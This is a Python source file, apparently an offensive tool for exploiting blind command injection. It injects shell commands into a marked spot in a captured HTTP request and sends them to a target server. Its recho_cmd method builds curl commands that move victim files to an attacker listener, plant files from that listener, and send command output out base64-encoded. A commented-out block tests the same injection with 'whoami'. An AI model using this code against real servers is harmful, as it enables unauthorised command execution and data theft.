import urllib

import aiohttp
from urllib.parse import quote


# 从文件中读取请求信息
class SendRequest:
    def __init__(self, args):
        self.listenerMethod = args.method.upper()
        self.listenerIP = args.listenerIP
        self.port = args.port
        if args.path and args.url is None:
            with open(args.path, 'r') as file:
                request_data = file.read()
            request_lines = request_data.split('\n')
            request_line_parts = request_lines[0].split(' ')
            self.method = request_line_parts[0]
            self.url = request_line_parts[1]
            self.headers = {}
            for line in request_lines[1:]:
                if line.strip():  # 跳过空行
                    key, value = line.split(': ')
                    self.headers[key] = value

            empty_line_index = request_data.find('\n\n')
            if empty_line_index != -1:
                self.body_data = request_data[empty_line_index + 2:]  # 加 2 是为了跳过空行
            else:
                self.body_data = ""
        if args.url:
            self.method = "GET"
            self.url = args.url
            self.headers = {}

    def recho_cmd(self, cmd):
        if cmd[:8] == "download":
            return f"curl -X POST -F \"file=@{cmd[9:]}\" http://{self.listenerIP}:{str(self.port)}/upload"
        elif cmd[:6] == "upload":
            payload = cmd[7:].split(' ')
            return f"curl -o {payload[1]} http://{self.listenerIP}:{str(self.port)}/file/uploads/{payload[0]}"
        elif self.listenerMethod == "POST":
            return f"curl -d \\\"HOST={self.headers.get('Host')}&CMD={cmd}&ECHO=$({cmd})\\\" http://{self.listenerIP}:{str(self.port)}"
        elif self.listenerMethod == "GET":
            return f"GOAL=\\\"http://{self.listenerIP}:{str(self.port)}/\\\" && curl $GOAL$(echo -n $({cmd} | base64) | sed \\\'s# #\\\'\\\"& ${{GOAL}}\\\"\\\'#g\\\')"

    async def httpRequestToCmd(self, cmd):
        url = ''
        if self.url.find('*') != -1:
            url = self.url.replace('*', quote(self.recho_cmd(cmd)))
        elif self.headers:
            for key in self.headers:
                if key == 'Accept':
                    # 这样编写则不会替换在Accept中的*号
                    continue
                index = self.headers[key].find('*')
                if index != -1:
                    self.headers[key] = self.headers[key].replace('*', self.recho_cmd(cmd))
        elif self.method == "POST" and self.body_data.find('*') != -1:
            url = self.body_data.replace('*', quote(self.recho_cmd(cmd)))

        http_url = ("http://" + self.headers.get('Host') + url) if url[:4] != "http" else url

        print("http_url:" + urllib.parse.unquote(http_url))
        if self.method == "GET":
            async with aiohttp.ClientSession() as session:
                async with session.get(http_url, headers=self.headers) as resp:
                    print("GET response status：", resp.status)
                    # print(await resp.text())
        elif self.method == "POST":
            async with aiohttp.ClientSession() as session:
                async with session.post(http_url, headers=self.headers, data=self.body_data) as resp:
                    print("POST response status：", resp.status)
                    # print(await resp.text())

# with open('../files/request.txt', 'r') as file:
#     request_data = file.read()
#
# # 将请求信息按行分割
# request_lines = request_data.split('\n')
#
# # 获取请求行中的路径和协议
# request_line_parts = request_lines[0].split(' ')
# method = request_line_parts[0]
# url = request_line_parts[1]


# 构建请求头
# headers = {}
# for line in request_lines[1:]:
#     if line.strip():  # 跳过空行
#         key, value = line.split(': ')
#         headers[key] = value

# httpurl = "http://" + headers.get('Host') + url
# print(httpurl)
# cmd = "whoami"
# for key in headers:
#     index = headers[key].find('*')
#     if index != -1:
#         headers[key] = headers[key].replace('*', cmd)

# # 发送 HTTP 请求
# response = requests.get(httpurl, headers=headers)
# print(headers)
# # 打印响应内容
# print(response.text)
